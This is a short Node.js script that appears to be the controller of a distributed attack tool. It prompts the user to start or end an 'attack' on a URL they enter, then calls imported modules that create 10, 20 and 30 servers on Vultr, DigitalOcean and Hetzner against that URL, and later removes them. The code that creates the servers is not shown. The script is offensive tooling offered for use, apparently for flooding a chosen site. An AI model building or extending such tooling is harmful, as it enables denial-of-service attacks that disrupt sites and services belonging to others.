import create_vultr from "./create_vultr.mjs"
import create_do from "./create_do.mjs"
import create_hetzner from "./create_hetzner.mjs"
import remove_vultr from "./remove_vultr.mjs"
import remove_do from "./remove_do.mjs"
import remove_hetzner from "./remove_hetzner.mjs"
//
import prompts from "prompts"

async function main() {
	const start_end = await prompts({
		type: "select",
		name: "value",
		message: "Start or End an Attack",
		choices: [
			{ title: "Start", value: "start" },
			{ title: "End", value: "end" },
		],
		initial: 1,
	})
	if (start_end.value == "end") {
		end()
		return
	}

    if (start_end.value == "start") {
        const response = await prompts({
            type: "text",
            name: "value",
            message: "URL for Attack",
        })
    
        start(response.value)
        return
    }

	
}
main()

async function start(url) {
	create_vultr(url, 10)
	create_do(url, 20)
	create_hetzner(url, 30)
}

async function end() {
	remove_vultr()
	remove_do()
	remove_hetzner()
}
